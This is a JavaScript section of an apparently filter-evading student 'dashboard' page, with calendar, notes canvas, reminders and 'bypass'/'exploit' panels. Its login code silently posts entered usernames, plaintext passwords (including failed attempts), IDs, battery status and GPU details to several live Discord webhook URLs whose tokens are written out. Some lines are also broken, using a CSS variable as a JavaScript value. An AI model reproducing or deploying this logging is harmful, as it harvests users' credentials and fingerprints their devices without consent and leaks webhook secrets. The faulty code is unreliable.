        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          this.toggleTheme();
          this.showNotification('Theme switched: ' + this.getSetting('theme'), 'info');
        });

        // Sync settings toggle with quick panel toggle
        const themeSettingsToggle = document.getElementById('themeToggleSettings');
        if (themeSettingsToggle) {
            themeSettingsToggle.addEventListener('change', () => {
                this.toggleTheme(themeSettingsToggle.checked ? 'light' : 'dark');
                this.showNotification('Theme switched: ' + this.getSetting('theme'), 'info');
            });
        }
      },

      toggleTheme: function(explicitTheme = null) {
          if (explicitTheme) {
              document.body.classList.toggle('light-theme', explicitTheme === 'light');
              this.setSetting('theme', explicitTheme);
          } else {
              document.body.classList.toggle('light-theme');
              this.setSetting('theme', document.body.classList.contains('light-theme') ? 'light' : 'dark');
          }

          document.getElementById('themeToggle').innerText = document.body.classList.contains('light-theme') ? '☀️ Light Mode' : '🌙 Dark Mode';
          if(document.getElementById('themeToggleSettings')) document.getElementById('themeToggleSettings').checked = document.body.classList.contains('light-theme');
      },
      
      // Initialize buttons
      initButtons: function() {
        document.querySelectorAll('.quick-bar button, .main-features-grid button, .handbook-buttons button, .ipad-options button, .bypass-buttons button').forEach(button => {
            if (button.id !== 'themeToggle') { // Theme toggle is handled separately
              button.addEventListener('click', () => {
                  const buttonText = button.textContent.split(' ')[1] || button.textContent;
                  this.showNotification(`You clicked: ${buttonText}`, 'info');
              });
            }
        });
        document.querySelectorAll('.links-list a, .exploit-buttons a, .handbook-buttons a').forEach(link => {
            link.addEventListener('click', () => {
                const linkText = link.textContent.trim();
                this.showNotification(`Navigating to: ${linkText}`, 'info');
            });
        });

        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          this.showNotification('Panic button activated!', 'error');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            this.showNotification('System restart initiated.', 'error');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          this.showNotification('Fix Issues routine completed. No issues found.', 'success');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
              this.showNotification(`Error entering full screen: ${err.message}`, 'error');
            });
            this.showNotification('Full screen mode enabled.', 'info');
          } else {
            document.exitFullscreen();
            this.showNotification('Full screen mode exited.', 'info');
          }
        });
        
        let zoomLevel = this.getSetting('uiDensity'); // Start with UI density
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (zoomLevel < maxZoom) {
            zoomLevel = Math.min(maxZoom, zoomLevel + zoomStep);
            document.body.style.zoom = zoomLevel;
            this.showNotification(`Zoom level: ${Math.round(zoomLevel * 100)}%`, 'info');
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (zoomLevel > minZoom) {
            zoomLevel = Math.max(minZoom, zoomLevel - zoomStep);
            document.body.style.zoom = zoomLevel;
            this.showNotification(`Zoom level: ${Math.round(zoomLevel * 100)}%`, 'info');
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            if(confirm('Are you sure you want to log out?')) {
                // Perform logout actions
                this.showNotification('Logging out...', 'info');
                // Simulate log out by refreshing or returning to login
                location.reload(); 
            }
        });

        // Initialize UI Density Range setting
        const uiDensityRange = document.getElementById('uiDensityRange');
        const uiDensityValueSpan = document.getElementById('uiDensityValue');
        if (uiDensityRange && uiDensityValueSpan) {
            uiDensityRange.value = this.getSetting('uiDensity');
            uiDensityValueSpan.textContent = this.getSetting('uiDensity');
            uiDensityRange.addEventListener('input', () => {
                uiDensityValueSpan.textContent = uiDensityRange.value;
                document.documentElement.style.fontSize = (uiDensityRange.value * 16) + 'px';
                this.setSetting('uiDensity', parseFloat(uiDensityRange.value));
            });
        }
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // Changed from quickPanelsContainer for clarity
        const updatesNotifications = document.getElementById('updatesNotifications');


        notesBtn.addEventListener('click', () => {
          // Hide relevant sections to show canvas
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          document.getElementById('mainFeaturesGrid').style.display = 'none';
          document.getElementById('infoPanelsContainer').style.display = 'none'; // Hide info panels when canvas is up
          document.querySelector('.quick-bar:nth-of-type(2)').style.display = 'none'; // The panel toggle buttons

          canvasContainer.style.display = 'block';
          this.showNotification('Notes canvas opened.', 'info');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          // Show relevant sections
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          document.getElementById('mainFeaturesGrid').style.display = 'flex';
          document.getElementById('infoPanelsContainer').style.display = 'block'; // Show info panels container again
          document.querySelector('.quick-bar:nth-of-type(2)').style.display = 'flex'; // The panel toggle buttons
          
          this.showNotification('Notes canvas closed.', 'info');
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Restore canvas from local storage or set white background
        const savedCanvas = localStorage.getItem('notesCanvasData');
        if (savedCanvas) {
            const img = new Image();
            img.onload = () => {
                ctx.drawImage(img, 0, 0);
            };
            img.src = savedCanvas;
        } else {
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || evt.touches[0].clientX) - rect.left,
            y: (evt.clientY || evt.touches[0].clientY) - rect.top
          };
        }

        const saveCanvasState = () => {
            localStorage.setItem('notesCanvasData', canvas.toDataURL());
        };

        canvas.addEventListener('mousedown', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('touchstart', (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = var(--primary-accent); /* Use CSS variable */
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        canvas.addEventListener('touchmove', (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = var(--primary-accent); /* Use CSS variable */
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, () => {
            if (drawing) {
                drawing = false;
                saveCanvasState(); // Save state after drawing
            }
          });
        });

        clearCanvasBtn.addEventListener('click', () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          saveCanvasState(); // Save cleared state
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.getElementById('dashboard'); // Capture entire dashboard
          html2canvas(elementToCapture, { 
              scale: window.devicePixelRatio, // Better quality screenshot
              useCORS: true // Handle images from different origins if any
            }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            this.showNotification('Dashboard screenshot taken.', 'success');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.showNotification('Notes canvas exported.', 'success');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
            const mainRowDisplay = mainGrid.style.display; // Check current state

            // Determine visibility for each primary content block
            const isMainGridVisible = mainGrid.style.display !== 'none';
            const isUpdatesNotificationsVisible = updatesNotifications.style.display !== 'none';
            const isMainFeaturesGridVisible = document.getElementById('mainFeaturesGrid').style.display !== 'none';
            const isInfoPanelsVisible = document.getElementById('infoPanelsContainer').style.display !== 'none';
            const isQuickBarPanelVisible = document.querySelector('.quick-bar:nth-of-type(2)').style.display !== 'none';


            if (isMainGridVisible || isUpdatesNotificationsVisible || isMainFeaturesGridVisible || isInfoPanelsVisible || isQuickBarPanelVisible) {
                mainGrid.style.display = 'none';
                updatesNotifications.style.display = 'none';
                document.getElementById('mainFeaturesGrid').style.display = 'none';
                document.getElementById('infoPanelsContainer').style.display = 'none';
                document.querySelector('.quick-bar:nth-of-type(2)').style.display = 'none'; // The panel toggle buttons
                toggleBtn.innerText = '⬇️ Show Sections';
                this.showNotification('All sections hidden.', 'info');
            } else {
                mainGrid.style.display = 'flex';
                updatesNotifications.style.display = 'flex';
                document.getElementById('mainFeaturesGrid').style.display = 'flex';
                document.getElementById('infoPanelsContainer').style.display = 'block'; // Make sure this shows the container, panels themselves might be hidden
                document.querySelector('.quick-bar:nth-of-type(2)').style.display = 'flex'; // The panel toggle buttons
                toggleBtn.innerText = '⬆️ Hide Sections';
                this.showNotification('All sections shown.', 'info');
            }
        });
      },
      
      // Initialize panels - All panels (old and new) are managed by display: none/block
      initPanels: function() {
        document.querySelectorAll('.info-panel, .ipad-content, .bypass-content').forEach(panel => {
          panel.style.display = 'none';
        });
        // Populate settings with initial values
        if (document.getElementById('settingsPanel')) {
            const langSelect = document.getElementById('languageSelect');
            if (langSelect) langSelect.value = this.getSetting('language');
            const timezoneSelect = document.getElementById('timezoneSelect');
            if (timezoneSelect) timezoneSelect.value = this.getSetting('timezone');
            const dateFormatSelect = document.getElementById('dateFormatSelect');
            if (dateFormatSelect) dateFormatSelect.value = this.getSetting('dateFormat');
            const autoSaveToggle = document.getElementById('autoSaveDataToggle');
            if (autoSaveToggle) autoSaveToggle.checked = this.getSetting('autoSaveData');
            
            const accentColorPicker = document.getElementById('accentColorPicker');
            if (accentColorPicker) accentColorPicker.value = this.getSetting('accentColor');
            const fontSelect = document.getElementById('fontSelect');
            if (fontSelect) fontSelect.value = this.getSetting('fontFamily');

            const enableDesktopNotifications = document.getElementById('enableDesktopNotifications');
            if (enableDesktopNotifications) enableDesktopNotifications.checked = this.getSetting('enableDesktopNotifications');
            const enableNotificationSound = document.getElementById('enableNotificationSound');
            if (enableNotificationSound) enableNotificationSound.checked = this.getSetting('enableNotificationSound');
            const notificationPersistence = document.getElementById('notificationPersistence');
            if (notificationPersistence) notificationPersistence.checked = this.getSetting('notificationPersistence');
            
            const reduceMotion = document.getElementById('reduceMotion');
            if (reduceMotion) reduceMotion.checked = this.getSetting('reduceMotion');

            const defaultSnooze = document.getElementById('defaultSnoozeDuration');
            if (defaultSnooze) defaultSnooze.value = this.getSetting('defaultSnooze');
            const reminderSoundSelect = document.getElementById('reminderSoundSelect');
            if (reminderSoundSelect) reminderSoundSelect.value = this.getSetting('reminderSound');
        }

        // Set up the event listener for apply custom background
        const customBackgroundInput = document.getElementById('customBackgroundInput');
        if (customBackgroundInput) {
            customBackgroundInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    dashboard.applyCustomBackground(customBackgroundInput.value);
                    dashboard.showNotification('Custom background applied (if valid URL) via Enter key.', 'info');
                }
            });
        }
      },
      
      // Panel toggle functions
      togglePanel: function(panelId) {
        // Hide all info panels first, then show the requested one.
        document.querySelectorAll('.info-panel').forEach(panel => {
            if (panel.id !== panelId) {
                panel.style.display = 'none';
            }
        });
        const panel = document.getElementById(panelId);
        panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        
        // Hide canvas if any panel is opened
        document.getElementById('canvasContainer').style.display = 'none';
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        this.showNotification(`iPad content for ${contentId} shown.`, 'info');
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        this.showNotification(`Bypass content for ${contentId} shown.`, 'info');
      },

      // NEW: Reminder System functionality
      initReminderSystem: function() {
        this.loadReminders();
        this.renderReminders();
        setInterval(() => this.checkReminders(), 5000); // Check every 5 seconds
      },

      loadReminders: function() {
        try {
            const storedReminders = localStorage.getItem('dashboardReminders');
            if (storedReminders) {
                this._reminders = JSON.parse(storedReminders).map(r => ({
                    ...r,
                    timestamp: new Date(r.timestamp) // Convert string back to Date object
                }));
            }
        } catch (e) {
            console.error("Error loading reminders:", e);
        }
      },

      saveReminders: function() {
        try {
            localStorage.setItem('dashboardReminders', JSON.stringify(this._reminders));
        } catch (e) {
            console.error("Error saving reminders:", e);
        }
      },

      addReminder: function() {
          const reminderText = document.getElementById('reminderText').value.trim();
          const reminderDate = document.getElementById('reminderDate').value;
          const reminderTime = document.getElementById('reminderTime').value;

          if (!reminderText || !reminderDate || !reminderTime) {
              this.showNotification('Please fill all reminder fields!', 'error');
              return;
          }

          const reminderDateTime = new Date(`${reminderDate}T${reminderTime}`);
          if (isNaN(reminderDateTime)) {
              this.showNotification('Invalid date or time for reminder!', 'error');
              return;
          }

          const newReminder = {
              id: Date.now(),
              text: reminderText,
              timestamp: reminderDateTime,
              completed: false
          };

          this._reminders.push(newReminder);
          this.sortReminders();
          this.saveReminders();
          this.renderReminders();
          this.showNotification('Reminder added successfully!', 'success');

          // Clear inputs
          document.getElementById('reminderText').value = '';
          document.getElementById('reminderDate').value = '';
          document.getElementById('reminderTime').value = '';
      },

      sortReminders: function() {
          this._reminders.sort((a, b) => a.timestamp - b.timestamp);
      },

      renderReminders: function() {
          const upcomingList = document.getElementById('upcomingRemindersList');
          const completedList = document.getElementById('completedRemindersList');
          upcomingList.innerHTML = '';
          completedList.innerHTML = '';

          const now = new Date();
          const formatReminder = (r) => {
              const dateOpts = { weekday: 'short', month: 'short', day: 'numeric' };
              const timeOpts = { hour: 'numeric', minute: 'numeric', hour12: true };
              const date = r.timestamp.toLocaleDateString(undefined, dateOpts);
              const time = r.timestamp.toLocaleTimeString(undefined, timeOpts);
              return `${date} at ${time}: ${r.text}`;
          };

          const createReminderElement = (reminder) => {
              const div = document.createElement('div');
              div.classList.add('reminder-entry');
              if (reminder.completed) {
                  div.classList.add('done');
              }
              div.innerHTML = `
                  <span>${formatReminder(reminder)}</span>
                  <div class="reminder-actions">
                      <button data-id="${reminder.id}" data-action="toggleComplete">
                          ${reminder.completed ? 'Unmark' : 'Complete'}
                      </button>
                      <button data-id="${reminder.id}" data-action="delete">Delete</button>
                  </div>
              `;
              div.querySelector('[data-action="toggleComplete"]').addEventListener('click', () => this.toggleReminderComplete(reminder.id));
              div.querySelector('[data-action="delete"]').addEventListener('click', () => this.deleteReminder(reminder.id));
              return div;
          };

          let hasUpcoming = false;
          let hasCompleted = false;

          this._reminders.forEach(r => {
              if (r.completed) {
                  completedList.appendChild(createReminderElement(r));
                  hasCompleted = true;
              } else {
                  if (r.timestamp > now) {
                      upcomingList.appendChild(createReminderElement(r));
                      hasUpcoming = true;
                  } else {
                      // Expired and not completed reminders
                      const expiredDiv = createReminderElement(r);
                      expiredDiv.style.backgroundColor = 'rgba(255, 0, 0, 0.3)'; // Highlight expired
                      expiredDiv.querySelector('span').innerHTML = `❗EXPIRED! ${formatReminder(r)}`;
                      upcomingList.prepend(expiredDiv); // Show expired at top of upcoming
                      hasUpcoming = true;
                  }
              }
          });

          if (!hasUpcoming) upcomingList.innerHTML = '<p>No upcoming reminders.</p>';
          if (!hasCompleted) completedList.innerHTML = '<p>No completed reminders.</p>';
      },

      toggleReminderComplete: function(id) {
          const index = this._reminders.findIndex(r => r.id === id);
          if (index > -1) {
              this._reminders[index].completed = !this._reminders[index].completed;
              this.saveReminders();
              this.renderReminders();
              this.showNotification(`Reminder "${this._reminders[index].text}" marked as ${this._reminders[index].completed ? 'completed' : 'pending'}.`, 'info');
          }
      },

      deleteReminder: function(id) {
          if (confirm('Are you sure you want to delete this reminder?')) {
              this._reminders = this._reminders.filter(r => r.id !== id);
              this.saveReminders();
              this.renderReminders();
              this.showNotification('Reminder deleted.', 'success');
          }
      },

      checkReminders: function() {
          if (!this.getSetting('enableReminderNotifications')) return;

          const now = new Date();
          this._reminders.forEach(r => {
              if (!r.completed && r.timestamp <= now && !r.notified) {
                  this.showNotification(`Reminder: ${r.text}`, 'success');
                  r.notified = true; // Mark as notified
                  this.saveReminders(); // Save the notified state
                  // Play reminder sound if enabled
                  if (this.getSetting('enableNotificationSound')) {
                      let soundUrl = '';
                      switch(this.getSetting('reminderSound')) {
                          case 'chime': soundUrl = 'https://www.soundjay.com/misc/sounds/chime-03.wav'; break;
                          case 'beep': soundUrl = 'https://www.soundjay.com/buttons/beep-07.wav'; break;
                          default: soundUrl = 'https://www.soundjay.com/phone/phone-ring-03.wav'; // More prominent default
                      }
                      const sound = new Audio(soundUrl);
                      sound.play().catch(e => console.log("Reminder sound play prevented: ", e));
                  }
              }
          });
          this.renderReminders(); // Update view to show expired status
      },

      clearCompletedReminders: function() {
        this._reminders = this._reminders.filter(r => !r.completed);
        this.saveReminders();
        this.renderReminders();
        this.showNotification('Completed reminders cleared.', 'info');
      },

      clearAllReminders: function() {
        if (confirm('Are you sure you want to clear ALL reminders? This cannot be undone.')) {
            this._reminders = [];
            this.saveReminders();
            this.renderReminders();
            this.showNotification('All reminders cleared.', 'info');
        }
      },

      exportUserData: function() {
        const userData = {
            profile: {
                username: document.getElementById('loggedInUser').textContent,
                userID: document.getElementById('loggedInID').textContent
            },
            settings: this._settings,
            reminders: this._reminders
        };
        const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(userData, null, 2));
        const downloadAnchorNode = document.createElement('a');
        downloadAnchorNode.setAttribute("href", dataStr);
        downloadAnchorNode.setAttribute("download", "private_system_user_data.json");
        document.body.appendChild(downloadAnchorNode);
        downloadAnchorNode.click();
        downloadAnchorNode.remove();
        this.showNotification('User data exported as JSON.', 'success');
      }

    }; /* End of dashboard object */


    /* Login System JavaScript */
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Loading Screen logic (outside dashboard scope, handles pre-login UI)
      const loadingOverlay1 = document.getElementById('loadingOverlay1');
      const loadingOverlay2 = document.getElementById('loadingOverlay2');
      const loadingOverlayDashboard = document.getElementById('loadingOverlayDashboard');

      function showLoadingScreen(overlayElement, duration) {
        return new Promise(resolve => {
            overlayElement.classList.add('visible');
            setTimeout(() => {
                overlayElement.classList.remove('visible');
                overlayElement.addEventListener('transitionend', () => {
                    overlayElement.style.display = 'none'; // Ensure it's truly hidden after fade out
                    resolve();
                }, { once: true });
            }, duration);
        });
      }

      window.addEventListener('load', async () => {
          document.body.classList.add('login-body'); // Set body class for login layout initially

          // First Loading Screen
          loadingOverlay1.style.display = 'flex';
          await showLoadingScreen(loadingOverlay1, 2500); // Display for 2.5 seconds

          // Second Loading Screen
          loadingOverlay2.style.display = 'flex';
          await showLoadingScreen(loadingOverlay2, 2000); // Display for 2 seconds

          // Then show Login Box
          loginBox.style.display = 'block';
          dashboard.showNotification('Please enter your credentials to log in.', 'info', 5000); // Notify for login prompt
      });


      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) throw new Error('Network response was not ok');
            return res.json();
        })
        .then(data => {
          users = data;
        })
        .catch((error) => {
          console.error('Failed to load user JSON data, using empty user array. Error:', error);
          users = []; // Ensure users is an array even on fetch failure
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
